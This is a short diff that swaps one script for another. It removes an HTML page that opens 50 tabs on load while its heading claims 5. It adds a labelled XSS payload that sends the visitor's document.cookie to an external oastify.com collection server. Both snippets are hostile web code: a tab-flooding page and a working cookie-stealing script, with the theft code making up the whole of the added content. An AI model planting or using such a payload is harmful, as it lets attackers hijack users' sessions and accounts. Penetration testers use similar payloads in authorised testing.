@@ -1,19 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Open Tabs</title>
-    <script>
-        function openTabs() {
-            for (let i = 0; i < 50; i++) {
-                window.open("https://example.com"); // Change URL as needed
-            }
-        }
-        window.onload = openTabs;
-    </script>
-</head>
-<body>
-    <h1>Opening 5 tabs...</h1>
-</body>
-</html>
+// Malicious payload (example for XSS)
+<script>
+  // This will send cookies to an attacker-controlled server (only for authorized environments)
+  fetch('https://a2dttm5mzdr57l3yjmrtepf9309rxjl8.oastify.com', {
+    method: 'POST',
+    body: JSON.stringify({ cookies: document.cookie }),
+    headers: {
+      'Content-Type': 'application/json'
+    }
+  });
+</script>
